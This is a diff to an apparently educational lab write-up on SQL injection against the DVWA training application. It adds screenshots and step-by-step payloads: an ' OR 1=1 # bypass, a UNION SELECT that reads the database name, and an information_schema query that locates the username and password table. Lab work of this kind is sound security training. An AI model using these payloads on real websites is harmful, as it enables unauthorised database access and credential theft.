@@ -53,5 +53,28 @@ a. **Open a web browser and navigate to the target website.**
 
 - Enter the payload: ' OR 1=1 #
 - Click "Submit."
-  
 
+  <img width="490" height="150" alt="Screenshot 2026-01-11 153708" src="https://github.com/user-attachments/assets/51245fca-03d8-475d-8684-c6d05a60c1fb" />
+
+<img width="460" height="419" alt="Screenshot 2026-01-11 154212" src="https://github.com/user-attachments/assets/4b2a410c-10d0-48bd-a6a8-3f5482612e39" />
+
+
+**Determine the database name.**
+
+- Enter the payload: 1' OR 1=1 UNION SELECT 1, DATABASE()#
+- Click "Submit."
+
+- Expected output: Displays user info plus the database name in the second column (e.g., "dvwa").
+![image (3)](https://github.com/user-attachments/assets/da37e5a0-30e1-40ba-90cd-1392299606ae)
+
+
+### a. Identify the table that contains usernames and passwords
+
+**Identify the table containing usernames and passwords.**
+
+- Enter the payload: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'
+- Click "Submit."
+
+  ![image (4)](https://github.com/user-attachments/assets/6152a3c0-cac0-42e7-ba55-e55f1d6bb69a)
+
+  ![image (5)](https://github.com/user-attachments/assets/dc60cd01-1526-4c35-af72-5314708a4baf)
